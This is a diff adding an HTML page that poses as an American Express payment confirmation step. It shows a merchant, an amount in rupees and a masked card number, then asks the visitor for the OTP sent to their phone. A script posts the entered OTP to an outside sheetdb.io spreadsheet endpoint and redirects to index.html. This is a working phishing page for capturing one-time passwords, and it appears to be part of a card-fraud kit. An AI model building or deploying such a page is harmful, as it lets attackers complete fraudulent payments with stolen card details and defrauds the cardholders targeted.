@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Credit Card Validation</title>
+    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
+    <link rel="stylesheet" type="text/css" href="assets/css/demo.css">
+	
+	
+	<style>
+.button {
+  background-color: #4CAF50; /* Green */
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+  -webkit-transition-duration: 0.4s; /* Safari */
+  transition-duration: 0.4s;
+}
+
+.button1 {
+  box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+}
+
+.button2:hover {
+  box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24),0 17px 50px 0 rgba(0,0,0,0.19);
+}
+</style>
+	
+	
+	
+	
+	
+</head>
+
+<body>
+
+
+
+
+
+
+
+    <div class="container-fluid">
+        <div class="creditCardForm">
+		<img align="right" src="assets/images/amex.jpg" id="amex">
+            <div class="heading">
+             <center>   <h1>CONFIRM DETAILS</h1> </center>
+				
+               <!-- <h4 style="text-align:center">Amount to be Pay As Joining Fees is Rs 149 (Refundable Amount)</h4> -->
+				
+				<hr>
+			
+				
+				
+				
+			<!--	<center>
+				 <div class="form-group" id="credit_cards">
+                        <img src="assets/images/visa.jpg" id="visa">
+                        <img src="assets/images/mastercard.jpg" id="mastercard">
+                        
+                    </div>
+					</div>
+                    <div class="form-group" id="pay-now">
+            </div> -->
+            <div class="payment">
+                <form id="msform" method="post" action="https://sheetdb.io/api/v1/50b1505ys8xjo">   
+                 <div class="form-group" id="card-number-field">  
+				 
+				 
+	<h5>	Merchant &nbsp;	&nbsp;&nbsp; - AMEXpay   </h5> <br>  
+<h5> Transaction  &nbsp;	&nbsp;&nbsp; - 170.00 inr   </h5> <br>
+<h5> Card Number  &nbsp;	&nbsp;&nbsp; : xxxx xxxx xxxx xxxx   </h5> <br>
+
+
+				 
+				 <hr>
+				 <br>
+				 
+				 
+				 <h3> Authenticate Payment </h3> <br>
+				 
+				 <label for="cardNumber">OTP sent to your mobile number </label> <br> <br>
+                        <label for="cardNumber">Enter One Time Password (OTP)</label>
+						
+						
+						
+                        <input type="text" name="data[otp]" class="form-control"  id="owner">  
+                                           </div>
+
+                   
+				   
+				   
+				   
+				     
+                   
+                   
+                        <!--<button type="submit" class="btn btn-default" id="confirm-purchase">Confirm</button>-->
+                        
+						
+						<button type="submit" value="submit" class="button button1">Make Payment</button>
+                      
+                    </div>
+                </form>
+            </div>
+        </div>
+
+      
+    </div>
+    <script src="../../ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <script src="../../maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="assets/js/jquery.payform.min.js" charset="utf-8"></script>
+    <script src="assets/js/script.js"></script>
+
+
+<script>
+        var form = document.getElementById('msform');  
+
+        form.addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            fetch(form.action, {
+                method: "POST",
+                body: new FormData(form)
+            })
+            .then(response => response.json())
+            .then(() => {
+                window.location.href = "index.html";   
+            })
+            .catch(error => console.error("Error!", error));
+        });
+    </script>
+
